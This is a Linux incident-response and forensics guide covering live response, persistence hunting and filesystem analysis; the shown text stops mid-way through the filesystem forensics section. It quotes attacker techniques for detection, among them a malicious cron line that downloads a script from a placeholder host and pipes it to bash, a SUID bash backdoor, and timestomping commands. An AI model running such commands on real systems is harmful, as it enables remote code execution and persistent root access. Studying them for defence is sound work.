# Digital Forensics and Incident Response on Linux

This guide covers the seven topics you listed, in order, with the commands, artifacts, and reasoning an investigator needs. The emphasis is on *why* each artifact matters and what it can tell you, as well as how to collect it.

---

## 1. Introduction to DFIR on Linux

### Why Linux forensics matters

Linux runs most of the internet's servers, nearly all public cloud workloads, the Kubernetes and container ecosystem, most network appliances, and a large share of IoT and embedded devices. Attackers know this. Cryptominers, ransomware aimed at ESXi and Linux hypervisors, webshells on Apache/Nginx, SSH brute-force botnets, supply-chain implants, and nation-state backdoors on edge devices all land on Linux. Most organisations have far more Windows DFIR skill than Linux DFIR skill, so the gap is expensive.

### How Linux differs from Windows forensically

The biggest difference is that there is no registry. Configuration lives in plain-text files, mostly under `/etc` for the system and in dotfiles in each home directory for users. This makes artifacts easy to read, but also easy for an attacker to edit without leaving the structured metadata that Windows registry hives give you, such as key LastWrite times.

Second, "everything is a file." Processes appear under `/proc`, devices under `/dev`, and kernel state under `/sys`. On a live system you can learn a lot by reading files. On a dead image those virtual filesystems are empty, because they only exist in RAM.

Third, there is no single "Linux." Debian/Ubuntu, RHEL/CentOS/Rocky/Alma, SUSE, Arch, Alpine (common in containers), and embedded BusyBox systems all differ. They put logs in different places (`/var/log/auth.log` versus `/var/log/secure`), use different package managers (dpkg/apt versus rpm/dnf), and have different defaults: Debian 12 no longer installs rsyslog, so it relies on journald alone. RHEL defaults to XFS, Fedora to Btrfs, and Ubuntu to ext4. Your first task on any case is always to establish exactly which distribution and version you are looking at.

Fourth, logging is decentralised and often weak. Many servers keep only a few weeks of rotated logs. auditd is frequently not configured. Shell history is written only when a shell exits cleanly, and it has no timestamps by default.

Finally, the permission model centres on root. Once an attacker has root, they can modify logs, binaries, the package database, and even the kernel. You must assume that tools on a compromised system may lie to you.

### The DFIR lifecycle

Most teams follow NIST SP 800-61 (Preparation → Detection & Analysis → Containment, Eradication & Recovery → Post-Incident Activity) or the SANS PICERL model (Preparation, Identification, Containment, Eradication, Recovery, Lessons learned). On Linux, preparation matters disproportionately. The questions you want answered before an incident include:

- Is auditd running with useful rules?
- Are logs shipped off-host to a SIEM?
- Is journald persistent?
- Do you have prebuilt LiME modules or AVML ready for your kernels?
- Do you have a trusted static toolkit?

### Order of volatility (RFC 3227)

Collect the most volatile evidence first:

1. CPU registers and cache.
2. Routing table, ARP cache, process table, kernel statistics, and memory.
3. Temporary filesystems (`/tmp` when it is tmpfs, `/dev/shm`, `/run`).
4. Disk.
5. Remote logging and monitoring data.
6. Physical configuration and network topology.
7. Archival media.

In practice this means capturing memory first, then live system state, then disk.

### Forensic soundness and trust

Every action you take on a live system changes it. You spawn processes, allocate memory, update atimes, and possibly write logs. The goal is not zero impact, which is impossible. The goal is minimal, documented, justified impact.

- **Record everything you do.** Running `script -a /mnt/usb/session.log` gives you a transcript of every command and its output.
- **Write output to external media or over the network**, never to the evidence disk.
- **Hash everything you collect** (SHA-256) and maintain chain of custody.
- **Use trusted binaries.** Userland rootkits replace `ps`, `ls`, `netstat`, and `ss`. `LD_PRELOAD` rootkits (for example Jynx, Azazel, and libprocesshider) hook libc functions so that even clean binaries lie. Kernel rootkits (for example Diamorphine, Reptile, and modern eBPF-based ones) lie to everything in userland.

A partial mitigation for tampered binaries is to bring statically linked tools (a static BusyBox, for example) on read-only media and run them with a clean environment. Static binaries defeat `LD_PRELOAD` hooks, but nothing in userland defeats a kernel rootkit. That is why memory acquisition and offline disk analysis matter.

### The core toolset

For collection:

- **LiME** and **AVML** for memory.
- **UAC (Unix-like Artifacts Collector)**, the de facto standard triage collector for Linux and Unix.
- **Velociraptor** and **osquery** for fleet-scale live response.
- **CyLR** for artifact collection.
- **dd/dc3dd/dcfldd** and **ewfacquire** for disk imaging.

For analysis:

- **The Sleuth Kit (TSK)** and **Autopsy** for filesystems.
- **Volatility 3** for memory.
- **Plaso/log2timeline** for super-timelines.
- **debugfs**, **ext4magic**, and **extundelete** for ext internals and recovery.
- **PhotoRec**, **foremost**, and **bulk_extractor** for carving.
- **YARA** for pattern hunting.
- **chkrootkit**, **rkhunter**, and **unhide** for rootkit indicators.

The SANS SIFT Workstation and the Tsurugi Linux distribution bundle most of these.

### What attackers typically do on Linux

Knowing the playbook tells you where to look. Initial access usually comes through SSH brute force or credential stuffing, exploitation of a web app or public-facing service (Confluence, Log4j, Exchange-style edge appliances, and so on), or stolen keys.

Execution often happens from `/tmp`, `/var/tmp`, or `/dev/shm`, because these are world-writable and often not monitored. Attackers frequently delete the binary after launching it; the process keeps running with a `(deleted)` executable.

Persistence usually uses one of these:

- Cron and systemd services or timers.
- `~/.ssh/authorized_keys`.
- Shell rc files.
- `/etc/rc.local`.
- `/etc/ld.so.preload`.
- Malicious PAM modules.
- udev rules, motd scripts, or APT hooks.
- Kernel modules.
- A new UID 0 account.

Privilege escalation typically relies on SUID binaries, sudo misconfigurations, kernel exploits (Dirty COW, Dirty Pipe, PwnKit in polkit), or capabilities. Defense evasion includes clearing or truncating logs, `unset HISTFILE`, timestomping with `touch`, and rootkits. Impact is most often cryptomining, followed by data theft, ransomware, and botnet enrolment.

---

## 2. Linux Live Response

Live response is the collection and analysis of evidence from a running system. It is essential when volatile data matters (running malware, network connections, fileless implants, encryption keys, mounted LUKS volumes) or when you cannot take the system offline.

### Before you touch anything

Decide whether to pull the plug, isolate the network, or keep the host live. Pulling power destroys memory. A graceful shutdown lets malware run cleanup routines and changes the disk. The usual best practice is to isolate the host at the network level (switch port, security group, or firewall), capture memory, capture live state, then image the disk.

Mount your response media and start recording:

```bash
mkdir /mnt/usb && mount /dev/sdX1 /mnt/usb
script -a /mnt/usb/case001_session.log
export PATH=/mnt/usb/bin:$PATH      # trusted static tools first
date -u; hostname                   # anchor the session in time
```

### Memory acquisition

Memory holds running processes (including hidden ones), injected code, network sockets, command lines, decrypted data, keys, and bash history of shells that haven't exited yet. Capture it first.

**LiME (Linux Memory Extractor)** is a loadable kernel module. It must be compiled for the *exact* kernel version running on the target, so ideally prebuild modules for your fleet. Compiling on the victim is a last resort because it installs packages and writes to disk.

```bash
insmod /mnt/usb/lime-$(uname -r).ko "path=/mnt/usb/mem.lime format=lime"
# Or stream over the network to avoid local writes:
insmod lime.ko "path=tcp:4444 format=lime"     # then on examiner: nc target 4444 > mem.lime
```

**AVML (Acquire Volatile Memory for Linux)**, from Microsoft, is a static userland binary that needs no kernel module. It reads from `/dev/crash`, `/proc/kcore`, or `/dev/mem`, whichever is available. It is ideal for cloud VMs and fleets with many kernels.

```bash
/mnt/usb/avml --compress /mnt/usb/mem.lime
```

Note that `/dev/mem` is restricted on modern kernels (`CONFIG_STRICT_DEVMEM`), so the old `dd if=/dev/mem` approach generally doesn't work. For virtual machines, it is often better to snapshot or suspend the VM from the hypervisor. This gives a memory file (`.vmem`, or a QEMU or Hyper-V dump) without touching the guest at all.

**Analysing Linux memory with Volatility 3** requires a symbol table (ISF JSON) matching the exact kernel. You build it with `dwarf2json` from a `vmlinux` that has debug symbols (from the distro's debug packages) plus `System.map`:

```bash
dwarf2json linux --elf vmlinux-5.15.0-91-generic --system-map System.map-5.15.0-91-generic > ubuntu-5.15.0-91.json
# place in volatility3/symbols/linux/
vol -f mem.lime linux.pslist
vol -f mem.lime linux.pstree
vol -f mem.lime linux.bash            # recovers bash history from memory, even if HISTFILE was unset
vol -f mem.lime linux.lsmod
vol -f mem.lime linux.hidden_modules  # modules unlinked from the module list
vol -f mem.lime linux.check_syscall   # hooked syscall table entries (rootkit indicator)
vol -f mem.lime linux.sockstat
vol -f mem.lime linux.malfind         # suspicious RWX memory regions
vol -f mem.lime linux.envars
vol -f mem.lime linux.elfs            # dump ELF binaries from process memory
```

`linux.bash` is particularly valuable because it recovers commands from the memory of running bash processes. This works even if the attacker disabled history files.

### System identification and time

```bash
date; date -u; timedatectl                 # current time, timezone, NTP sync status
uptime; cat /proc/uptime                   # boot time helps bound the investigation
uname -a; cat /proc/version
cat /etc/os-release; hostnamectl
cat /proc/cmdline                          # kernel boot parameters (look for odd init= or module params)
```

Always record the offset between system time and real time. A clock that is off by several minutes will skew every correlation you make with firewall or SIEM logs.

### Logged-in users and login history

```bash
w                 # who is on, from where, what they're running
who -a
last -Fiw         # successful logins/logouts from /var/log/wtmp, full timestamps, IPs
lastb -Fiw        # failed logins from /var/log/btmp (root required)
lastlog           # last login per account
```

### Processes

Processes are where running malware reveals itself.

```bash
ps auxwwf                                  # full command lines, forest view shows parent/child
ps -eo pid,ppid,user,lstart,etime,stat,cmd --sort=lstart   # exact start times
pstree -alp
top -b -n 1                                # CPU hogs (cryptominers)
```

Look for these warning signs:

- Processes running from `/tmp`, `/dev/shm`, `/var/tmp`, or hidden directories (`/tmp/.X11-unix/.x`, `/var/tmp/...`).
- Names mimicking kernel threads. Real kernel threads appear in brackets like `[kworker/0:1]` and have no executable or command line. A userland process that fakes the brackets will still have an `exe` link.
- Web server users (`www-data`, `apache`, `nginx`) spawning shells, `curl`, `wget`, `python`, or `perl`. This is the classic webshell signature.
- Long-running `nc`, `socat`, `bash -i`, or `python -c` processes, which suggest reverse shells.
- Unexplained high CPU usage.

### The /proc filesystem

For any suspicious PID, `/proc/<pid>/` is a goldmine:

```bash
ls -l /proc/<pid>/exe          # path to the binary; "(deleted)" means it was removed from disk
cat /proc/<pid>/cmdline | tr '\0' ' '
cat /proc/<pid>/environ | tr '\0' '\n'   # look for LD_PRELOAD, attacker env vars, SSH_CLIENT
ls -l /proc/<pid>/cwd          # working directory
ls -l /proc/<pid>/fd           # open files and sockets
cat /proc/<pid>/maps           # loaded libraries and memory regions
cat /proc/<pid>/status         # UID/GID, capabilities, parent PID
cat /proc/<pid>/stack          # kernel stack (root)
```

An executable that was deleted from disk can still be recovered from a running process, because the kernel keeps the inode alive while the process runs:

```bash
ls -l /proc/*/exe 2>/dev/null | grep deleted
cp /proc/<pid>/exe /mnt/usb/recovered_<pid>.bin
sha256sum /mnt/usb/recovered_<pid>.bin
```

The same trick works for deleted files that a process still holds open. List them with `lsof +L1` (open files with a link count below 1) and copy them out via `/proc/<pid>/fd/<n>`.

### Network state

```bash
ss -tulpan                    # listening and established TCP/UDP with owning process
ss -tanp state established
netstat -antup                # older systems
lsof -i -n -P
ip addr; ip route; ip neigh   # interfaces, routes, ARP cache
iptables-save; nft list ruleset
cat /etc/resolv.conf /etc/hosts
```

Look for these:

- Listeners on unusual ports.
- Connections to mining pools (often ports 3333, 4444, 5555, 7777, 14444, or 45700).
- Outbound connections from services that shouldn't make them.
- Interfaces in promiscuous mode (`ip link` shows `PROMISC`), which suggests a sniffer.
- Unexpected tunnel interfaces.
- Hijacked DNS entries in `/etc/hosts`, which some miners use to block competitors or security vendors.

### Kernel modules and kernel state

```bash
lsmod; cat /proc/modules
modinfo <module>
cat /proc/sys/kernel/tainted  # non-zero can mean unsigned/out-of-tree modules loaded
dmesg -T | tail -200          # module loads, segfaults, USB devices, OOM kills
```

A module that appears in `/sys/module` but not in `lsmod`, or a tainted kernel with no legitimate explanation, points to an LKM rootkit. Rootkits commonly hide themselves from the module list, which is why memory analysis with `linux.hidden_modules` is more reliable.

### Mounted filesystems

```bash
mount; findmnt; df -h
cat /proc/mounts
lsblk -f                      # block devices, filesystems, UUIDs, LUKS containers
```

If the system uses LUKS full-disk encryption, the volume is unlocked right now. You may want a *logical* image of the mounted filesystem, or the decrypted device-mapper device (`/dev/mapper/...`), before shutdown. After shutdown, you will need the passphrase or key.

---

## 3. Linux Live Response, Part 2: Persistence, Integrity, and Triage Automation

Part 1 covered what is happening *right now*. Part 2 covers how the attacker gets back in, what they changed, and how to collect all of it efficiently.

### Scheduled tasks

```bash
for u in $(cut -d: -f1 /etc/passwd); do echo "== $u"; crontab -l -u "$u" 2>/dev/null; done
cat /etc/crontab
ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly
ls -la /var/spool/cron/ /var/spool/cron/crontabs/      # per-user crontabs (Debian: crontabs/, RHEL: cron/)
atq; ls -la /var/spool/at /var/spool/cron/atjobs 2>/dev/null
systemctl list-timers --all
```

The classic malicious cron line downloads and pipes to a shell every minute, for example `* * * * * curl -s http://x.x.x.x/a.sh | bash`. Often it is base64-encoded, or it sits in a file named to look legitimate, such as `/etc/cron.d/0anacron` or `/etc/cron.hourly/sshd`.

### systemd services and other init mechanisms

```bash
systemctl list-units --type=service --state=running
systemctl list-unit-files --state=enabled
ls -la --time-style=full-iso /etc/systemd/system/ /etc/systemd/system/*.wants/ \
       /lib/systemd/system/ /usr/lib/systemd/system/ ~/.config/systemd/user/
systemctl cat <suspicious>.service
ls -la /etc/init.d/ /etc/rc*.d/; cat /etc/rc.local 2>/dev/null
```

A malicious unit usually has an `ExecStart` pointing to `/tmp`, a hidden directory, or a shell one-liner, often with `Restart=always`. Sort the unit directories by modification time: a unit file much newer than the OS install date deserves scrutiny. Also check user-level units (`~/.config/systemd/user/`) and systemd generators (`/etc/systemd/system-generators/`, `/usr/lib/systemd/system-generators/`), which are an under-watched persistence location.

### SSH and account persistence

```bash
awk -F: '$3==0' /etc/passwd                 # every UID-0 account (should be only root)
awk -F: '$7!~/(nologin|false)/' /etc/passwd # accounts with real shells
ls -la --time-style=full-iso /etc/passwd /etc/shadow /etc/group /etc/sudoers
cat /etc/sudoers; ls -la /etc/sudoers.d/
find / -name authorized_keys -o -name authorized_keys2 2>/dev/null -exec ls -la {} \; -exec cat {} \;
grep -Ei 'AuthorizedKeysFile|PermitRootLogin|PasswordAuthentication' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/* 2>/dev/null
```

Attackers commonly add their key to `root`'s or a service account's `authorized_keys`. Some change `AuthorizedKeysFile` in `sshd_config` to point to an extra hidden file, so always check that directive rather than assuming the default.

### Shell initialisation and library preloading

```bash
cat /etc/ld.so.preload 2>/dev/null          # should normally not exist or be empty
ls -la /etc/ld.so.conf.d/
cat /etc/profile /etc/bash.bashrc /etc/environment; ls -la /etc/profile.d/
for h in /root /home/*; do ls -la $h/.bashrc $h/.bash_profile $h/.profile $h/.bash_logout $h/.zshrc 2>/dev/null; done
grep -r LD_PRELOAD /etc /home /root 2>/dev/null
```

Any entry in `/etc/ld.so.preload` is loaded into *every* dynamically linked process. This is the mechanism behind most userland rootkits, so treat any unexplained entry as critical.

### Other persistence locations worth checking

Several locations are less well known:

- **PAM modules** (`/etc/pam.d/`, `/lib/x86_64-linux-gnu/security/`, `/usr/lib64/security/`). A patched `pam_unix.so` can log passwords or accept a master password.
- **udev rules** (`/etc/udev/rules.d/`), which can run a command when a device event fires.
- **MOTD scripts** (`/etc/update-motd.d/` on Ubuntu), which run as root on every SSH login.
- **APT hooks** (`/etc/apt/apt.conf.d/` with `APT::Update::Pre-Invoke`) and **yum/dnf plugins**.
- **XDG autostart** (`/etc/xdg/autostart/`, `~/.config/autostart/`) on desktops.
- **Kernel module autoload** (`/etc/modules`, `/etc/modules-load.d/`, `/etc/modprobe.d/`).
- **Git hooks**, **web application plugins**, and **container images or entrypoints**.

### Binary and package integrity

Use the package manager to find system files that differ from what was installed:

```bash
# Debian/Ubuntu
dpkg --verify            # lines with '5' = MD5 mismatch
debsums -c               # changed files (install debsums)
# RHEL/Fedora/SUSE
rpm -Va                  # S=size, 5=digest, M=mode, T=mtime changed; ignore expected 'c' config files
```

A modified `/usr/bin/ps`, `/usr/sbin/sshd`, `/bin/login`, or PAM library is a strong indicator of compromise. However, a root-level attacker can also tamper with the package database, so repeat this check offline against the disk image, and ideally compare hashes against a known-good reference system.

### Privilege-related file attributes

```bash
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; 2>/dev/null   # SUID/SGID
getcap -r / 2>/dev/null           # file capabilities (e.g. cap_setuid on python = root backdoor)
lsattr -a /etc /root 2>/dev/null | grep -- '-i-'   # immutable files: attackers use chattr +i to protect persistence
```

A SUID copy of `bash` hidden somewhere (`/tmp/.bash` with mode 4755) is a classic backdoor; running `bash -p` from it gives a root shell. Compare the SUID list against a baseline of the same distro.

### Hunting for recently changed and suspicious files

```bash
find / -xdev -type f -mtime -3 -ls 2>/dev/null | grep -Ev '/proc|/sys'
find / -xdev -newer /etc/hostname -type f 2>/dev/null        # anything newer than a reference file
find /tmp /var/tmp /dev/shm -type f -exec file {} \; 2>/dev/null | grep -i elf
find / -xdev -name '.*' -type d 2>/dev/null | grep -Ev '/(proc|sys|run)|\.cache|\.config|\.local'
find / -xdev -nouser -o -nogroup 2>/dev/null                 # orphaned files (deleted attacker accounts)
```

### Detecting hidden processes

A rootkit that hides a PID from `ps` often can't hide it from every interface. Compare the PIDs that `/proc` shows with what `ps` reports, or use `unhide` (`unhide proc`, `unhide sys`, `unhide brute`), which probes PIDs by brute force. Discrepancies between `ss` and `/proc/net/tcp` can similarly reveal hidden sockets.

### History files

```bash
for h in /root /home/*; do echo "== $h"; ls -la $h/.*history 2>/dev/null; cat $h/.bash_history 2>/dev/null; done
```

Bash writes history only when a shell exits, and without timestamps unless `HISTTIMEFORMAT` was set. If it was set, each command is preceded by a `#<epoch>` line. Signs of anti-forensics include:

- A `.bash_history` that is empty, zero-length, or symlinked to `/dev/null`.
- `unset HISTFILE`, `export HISTSIZE=0`, or `history -c` appearing in history.
- Commands with a leading space, which are hidden if `HISTCONTROL` includes `ignorespace`. Ubuntu's default `ignoreboth` includes it.

Also check `.mysql_history`, `.psql_history`, `.python_history`, `.lesshst`, `.viminfo`, and `.wget-hsts`.

### Containers

On container hosts, compromise often lives inside a container:

```bash
docker ps -a; docker inspect <id>; docker diff <id>     # diff shows files Added/Changed/Deleted vs image
docker logs <id>; docker export <id> -o /mnt/usb/container.tar
crictl ps -a         # containerd/CRI-O on Kubernetes nodes
```

Also look for privileged containers, host path mounts (especially `/` or `/var/run/docker.sock`), and images you don't recognise.

### Automating triage

Doing all of this by hand is slow and error-prone. **UAC** is the standard tool: it runs from a portable directory, uses only built-in tools, supports Linux, macOS, the BSDs, Solaris, AIX, and ESXi, and outputs a tarball with hashes.

```bash
./uac -p ir_triage /mnt/usb/output      # standard incident-response profile
./uac -p full -m /mnt/usb/output        # full profile plus memory capture via AVML
```

For many hosts, **Velociraptor** (with `Linux.*` artifacts) and **osquery** let you run these queries across the fleet and hunt for indicators at scale. If you must script it yourself, the pattern is the same: run each command, write output to external media with a timestamped filename, hash the outputs at the end, and log everything with `script`.

---

## 4. Linux File Systems

### The Filesystem Hierarchy Standard (FHS)

Knowing what *belongs* where lets you spot what doesn't.

| Path | Purpose | Forensic relevance |
|---|---|---|
| `/bin`, `/sbin`, `/usr/bin`, `/usr/sbin` | Binaries (merged into `/usr` on modern distros) | Trojaned utilities, dropped tools |
| `/boot` | Kernel, initramfs, GRUB config | Bootkits, altered kernel parameters, `System.map` for memory analysis |
| `/dev` | Device nodes | `/dev/shm` is tmpfs and a favourite malware staging area |
| `/etc` | System configuration | Accounts, persistence, network config |
| `/home`, `/root` | User homes | History files, SSH keys, user activity |
| `/lib`, `/lib64`, `/usr/lib` | Libraries, kernel modules | Malicious `.so` files, rootkit modules in `/lib/modules/$(uname -r)` |
| `/opt`, `/srv` | Third-party software, service data | Web apps and webshells |
| `/proc`, `/sys` | Virtual kernel interfaces | Live only; empty in an image |
| `/run` | Runtime data (tmpfs) | `utmp`, PID files; lost at reboot |
| `/tmp`, `/var/tmp` | Temporary files | `/tmp` is often tmpfs (cleared at boot); `/var/tmp` persists |
| `/var` | Variable data | Logs, spools, caches, package DBs, container storage, web roots |

### The ext family (ext2, ext3, ext4)

ext4 is still the most common Linux filesystem, and it is the one you must know well.

**Layout.** The volume is divided into *block groups*. The *superblock* sits at byte offset 1024 and holds global metadata: block size, inode count, mount count, last mount and write times, last mount path, UUID, feature flags, and the magic number `0xEF53`. Backup copies exist in some block groups. Each group has a *group descriptor*, a *block bitmap* and an *inode bitmap* (allocation status), and a slice of the *inode table*. ext4's `flex_bg` feature packs the metadata of several groups together.

**Inodes.** Each file and directory is described by an inode. An inode holds the mode (type plus permissions), owner UID and GID, size, link count, flags, timestamps, and a pointer to the data. It does *not* hold the filename; names live in directory entries that map a name to an inode number. This is why one inode can have multiple names (hard links), and why a deleted directory entry can still reveal a name for an inode.

ext4 inodes are 256 bytes by default. The first 128 bytes are the classic ext2 layout. The extra space holds nanosecond timestamps, the **creation time (crtime)**, and inline extended attributes.

**Reserved inodes.** Inode 1 is the bad blocks list, 2 is the root directory, 5 is the bootloader, 7 is the resize inode, 8 is the **journal**, and 11 is usually `lost+found`, the first non-reserved inode.

**Extents.** ext2 and ext3 mapped data with direct, indirect, double-indirect, and triple-indirect block pointers. ext4 uses *extents*: (start block, length) runs stored in a small tree whose root is in the inode. Extents are more efficient and affect how recovery works (see below).

**Directories.** Directory entries are stored as linked records (inode number, record length, name length, file type, name). Large directories use an *htree*, a hashed B-tree index.

**The journal (jbd2).** ext3 and ext4 write metadata changes (and in `data=journal` mode, data too) to a circular journal before committing them. The default mode is `data=ordered`, which journals metadata only. Forensically, the journal can contain *older copies of inode and directory blocks*, which is exactly what makes recovering deleted files possible on ext4.

**Timestamps.** Each ext4 inode stores four timestamps:

| Timestamp | Meaning | Updated when |
|---|---|---|
| **mtime** (modified) | File content changed | Data is written |
| **atime** (accessed) | File content read | Governed by mount options; default `relatime` updates only if atime is older than mtime/ctime or more than 24 hours old, and `noatime` disables it entirely |
| **ctime** (changed) | Inode metadata changed | Permissions, owner, link count, size, or rename change; also any mtime change |
| **crtime** (born) | Inode created | ext4 only, in the extended inode area |

ext4 also sets a **dtime** (deletion time) in the inode when a file is deleted. Timestamps are 32-bit seconds plus extra bits for nanoseconds and dates beyond 2038.

**What happens on deletion.** This is critical for recovery expectations. On **ext2**, deletion marks the inode and blocks free and sets dtime, but leaves the block pointers intact, so recovery through the inode is easy. On **ext3 and ext4**, the kernel *zeroes the block pointers or extent entries* in the inode, sets dtime, and frees the bitmaps. The directory entry is "removed" by extending the previous entry's record length over it, so the name and inode number often survive in slack space. The result is that you can often find the *name* and *metadata* of a deleted file but not *where its data was*. Your options are journal analysis (ext4magic, extundelete), carving, or luck.

### XFS

XFS is the default on RHEL 7 and later and their derivatives, so it is very common on enterprise servers. It divides the volume into **allocation groups (AGs)**, each with its own free-space and inode B+trees, which enables parallel I/O.

Inodes are allocated dynamically in chunks of 64, and the inode number encodes the AG and location. XFS v5 (the default on modern systems) adds CRC checksums on metadata and a creation timestamp. XFS has its own metadata log, which should not be replayed when you mount evidence.

Forensic tool support is less mature than for ext4. Recent TSK versions have added XFS support, and `xfs_db` (read-only with `-r`) lets you inspect inodes and structures directly. Deleted-file recovery on XFS is generally hard, because inode extent data is typically cleared, so carving is usually needed.

### Btrfs

Btrfs is the default on Fedora and openSUSE. It is a **copy-on-write (CoW)** filesystem: modifications write new blocks instead of overwriting in place, and metadata lives in B-trees with checksums. It supports **subvolumes** and **snapshots**, which are forensically wonderful. openSUSE's snapper takes automatic snapshots before and after package operations, so you may find historical versions of files the attacker changed or deleted. Old tree roots can also sometimes be used to reach earlier filesystem states (`btrfs restore`, `btrfs-find-root`). Tooling support in TSK is limited; use the native btrfs-progs utilities in read-only mode.

### ZFS

ZFS is common on storage servers and some Ubuntu and FreeBSD installs. It is also copy-on-write, has pooled storage (zpools), snapshots, and checksums. The same opportunities apply: snapshots, and older uberblocks and transaction groups. The same difficulty applies too: the forensic tooling is specialised.

### Volume management and encryption layers

Real systems rarely put a filesystem directly on a partition. Expect some combination of these:

- **LVM**: physical volumes, then volume groups, then logical volumes. Watch for snapshot LVs.
- **mdadm software RAID**.
- **LUKS/dm-crypt** encryption. LUKS1 and LUKS2 headers are identifiable, and the header contains keyslots. Without the passphrase or key file, the data is inaccessible, which is another strong argument for capturing mounted volumes live.

### Virtual and memory-backed filesystems

`proc`, `sysfs`, `devtmpfs`, `tmpfs` (often `/tmp`, `/run`, `/dev/shm`), `cgroup`, and `overlayfs` (container layers) exist in memory or are built on the fly. They vanish at power-off, which is why live response matters.

### Swap

The swap partition or swap file can contain paged-out process memory: fragments of commands, credentials, and decrypted data. Image it and run `strings`, `bulk_extractor`, or YARA over it. Swap may be encrypted on some setups.

---

## 5. Linux File System Forensics

### Acquisition

Image the disk with a write blocker for physical media. For cloud workloads, take a snapshot of the volume and attach a copy to a forensic instance.

```bash
dc3dd if=/dev/sdb of=/evidence/disk.dd hash=sha256 log=/evidence/disk.log
ewfacquire /dev/sdb                          # E01 format with embedded metadata and compression
dd if=/dev/sdb of=/evidence/disk.dd bs=4M conv=noerror,sync status=progress
sha256sum /dev/sdb /evidence/disk.dd
```

On a live system you can also image the running device (a "live image"). It won't be perfectly consistent, but sometimes it is the only option, for example with an unlocked LUKS volume.

### Understanding the image

```bash
mmls disk.dd              # partition table: note start sectors
fdisk -l disk.dd
fsstat -o 2048 disk.dd    # filesystem details: type, last mount time, last mount point, block size, feature flags
file -s /dev/loop0p1
```

`fsstat` tells you the last mounted and last written times and the last mount directory, which helps build context.

### Mounting safely

Mount read-only, and **don't let the journal replay**. Replaying modifies the evidence and can destroy the pending metadata you want to analyse.

```bash
# ext3/ext4 - noload skips journal replay
mount -o ro,noload,noexec,nodev,loop,offset=$((2048*512)) disk.dd /mnt/evidence
# XFS - norecovery skips log replay
mount -o ro,norecovery,noexec,loop,offset=$((2048*512)) disk.dd /mnt/evidence
```

For LVM or multiple partitions, map the image and activate the volume group:

```bash
losetup -r -P -f --show disk.dd       # read-only, partitions as /dev/loopNpX
pvscan; vgscan; vgchange -ay          # activate volume groups
lvs; mount -o ro,noload /dev/vgname/root /mnt/evidence
# LUKS
cryptsetup luksOpen --readonly /dev/loop0p3 evidence_crypt
```

Watch for a clash: if the image's volume group has the same name as your workstation's (for example `ubuntu-vg`), rename it carefully or use a dedicated analysis machine.

For E01 files, expose them first with `ewfmount disk.E01 /mnt/ewf`, then work with `/mnt/ewf/ewf1`.

### The Sleuth Kit workflow

TSK works directly on the image without mounting it, reading raw filesystem structures, including deleted entries.

```bash
fls -o 2048 -r -p disk.dd                   # recursive listing, full paths; '*' marks deleted entries
fls -o 2048 -r -d -p disk.dd                # deleted entries only
istat -o 2048 disk.dd 1234567               # full inode metadata: all timestamps, size, blocks
icat -o 2048 disk.dd 1234567 > recovered    # extract content by inode number
ils -o 2048 disk.dd                         # list inodes (including unallocated with -A)
ffind -o 2048 disk.dd 1234567               # inode -> filename
ifind -o 2048 -d 987654 disk.dd             # data block -> owning inode
blkcat -o 2048 disk.dd 987654               # dump a raw block
tsk_recover -o 2048 -e disk.dd /out/        # export all files (-e includes allocated; default = unallocated)
```

### debugfs for ext internals

`debugfs` opens an ext filesystem directly and can show things standard tools won't, notably the crtime and dtime:

```bash
debugfs -c -R 'stat <1234567>' /dev/loop0p1      # -c = catastrophic (read-only, no bitmaps)
debugfs -c -R 'stat /usr/bin/ps' /dev/loop0p1
debugfs -c -R 'logdump -a' /dev/loop0p1          # dump journal transactions
```

On a live system with a recent kernel (4.11 or later) and coreutils (8.31 or later), `stat` also shows the `Birth:` time via `statx()`.

### Timeline analysis

Timelines turn millions of timestamps into a story. The classic filesystem timeline uses TSK:

```bash
fls -o 2048 -r -m / disk.dd > body.txt          # body file with MAC(B) times
mactime -b body.txt -d -z UTC 2024-03-01..2024-03-15 > fs_timeline.csv
```

In `mactime` output, each row shows which timestamps changed at that moment as the `macb` flags (modified, accessed, changed, born). A cluster of `..cb` (created) entries in `/tmp` and `/etc/systemd/system` at 03:12 UTC, followed by `.a..` accesses of `/usr/bin/curl`, tells a clear story.

A **super-timeline** adds logs and other artifacts using Plaso:

```bash
log2timeline.py --storage-file case.plaso disk.dd
psort.py -o l2tcsv -w supertimeline.csv case.plaso "date > '2024-03-01' AND date < '2024-03-15'"
```

Plaso parses syslog, auth logs, journald, wtmp and utmp, bash history (with timestamps), dpkg and apt logs, and much more, merging them into a single view. Timeline Explorer (on Windows) or Timesketch (collaborative, web-based) make the output easy to navigate.

### Detecting timestomping

Attackers use `touch -r /bin/ls /tmp/malware` or `touch -d "2019-01-01" file` to make files look old. Several things give them away. `touch` can set atime and mtime, but **not ctime**: changing timestamps is itself a metadata change, so ctime updates to the time of the tampering (unless the attacker also changed the system clock, which leaves its own traces). `touch` cannot set **crtime** either. A file with an mtime in 2019 and a crtime last Tuesday is suspicious.

Nanosecond values are another tell. Timestamps set with `touch -d` often have zero nanoseconds (`.000000000`), while genuine timestamps rarely do.

**Inode numbers** are a further clue. Files installed together (for example the contents of `/usr/bin` from the OS install) tend to have inode numbers close to each other. A trojaned `/usr/bin/ps` replaced later often has an inode number far outside its neighbours' range:

```bash
ls -lai /usr/bin | sort -n | less     # look for outliers
```

### Recovering deleted files

As explained above, ext4 deletion wipes the extents, so recovery depends on other sources.

**Journal-based recovery** uses older copies of inodes still in the journal:

```bash
ext4magic /dev/loop0p1 -a $(date -d "2024-03-10" +%s) -f /tmp -r -d /out/
extundelete /dev/loop0p1 --restore-all --output-dir /out/
```

These tools work best soon after deletion, before journal wrap-around overwrites the old metadata.

**Carving** ignores the filesystem and searches unallocated space for file signatures:

```bash
blkls -o 2048 disk.dd > unalloc.raw          # extract unallocated blocks only
photorec /d /out/ unalloc.raw
foremost -i unalloc.raw -o /out/
bulk_extractor -o /out/be disk.dd            # emails, URLs, IPs, credit cards, etc.
```

Carving recovers content but loses names and metadata, and fragmented files often come back incomplete. Plain-text files such as scripts and logs are easy to find by keyword search even when fragmented:

```bash
grep -a -b -i 'wget http' unalloc.raw | head
strings -a -t d unalloc.raw | grep -i 'authorized_keys'
```

### Hashing and known-file filtering

Hash all files, exclude known-good ones (NSRL, or hashes from a clean reference system of the same distro and version), and check the remainder against threat intelligence and YARA rules:

```bash
find /mnt/evidence -xdev -type f -exec sha256sum {} \; > hashes.txt
